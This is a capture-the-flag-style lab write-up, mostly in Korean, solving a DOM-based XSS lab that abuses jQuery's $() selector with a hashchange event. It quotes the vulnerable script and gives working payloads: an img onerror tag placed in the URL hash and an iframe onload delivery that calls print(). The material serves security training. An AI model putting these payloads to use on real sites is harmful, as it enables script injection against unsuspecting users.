# 🚩Lab: DOM XSS in jQuery selector sink using a hashchange event

This lab contains a DOM-based cross-site scripting vulnerability on the home page. 
It uses `jQuery's $() selector` function to auto-scroll to a given post, whose title is passed via the `location.hash` property.
To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.


### 🔍 분석 및 공격 과정
1. 해당 문제는 jQuery를 통해 URL의 해쉬값이 변경될 때 자동 스크롤링을 하는 스크립트가 존재한다.
```html
<script>
$(window).on('hashchange', function(){
  var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
if (post) post.get(0).scrollIntoView();
});
</script>                  

2. blog-list 섹션의 h2태그 내부 내용이 hash값의 내용을 포함할 경우 그곳으로 오토 스크롤을 하는 코드이다.
3. jQuery의 `$()`는 문법은 고전적인 문제가 있는데 만약 값으로 `<p>` 같은 새로운 태그를 입력으로 받을 경우, 해당 태그를 만들어 낸다. ( `$('p')` ) 이러한 문제는 최신버전의 jQuery에서는 수정되었다. (3.0이상)
   <img src=1 onerror=print()> 를 해시값으로 준다면 $('section.blog-list h2:contains(' + decodeURIComponent("<img src=1 onerror=print()>") + ')'); 가 되고 새로운 img 태그를 만들어낸다.
5. 근데 이건 어쨋든 해쉬값이 변경되는 이벤트가 일어나야 하는데, 이는 iframe과 onload를 결합함으로써 구현할 수 있다.
6.  <iframe src='https://도메인/#' onload="this.src+=<img src=1 onerror=print()>"></iframe> 
```


### 💡 취약점 원리
 고전적인 jQuery의 $가 <>를 받을 경우 생기는 HTML 파싱 문제로 부터 발생한 DOM based-xss
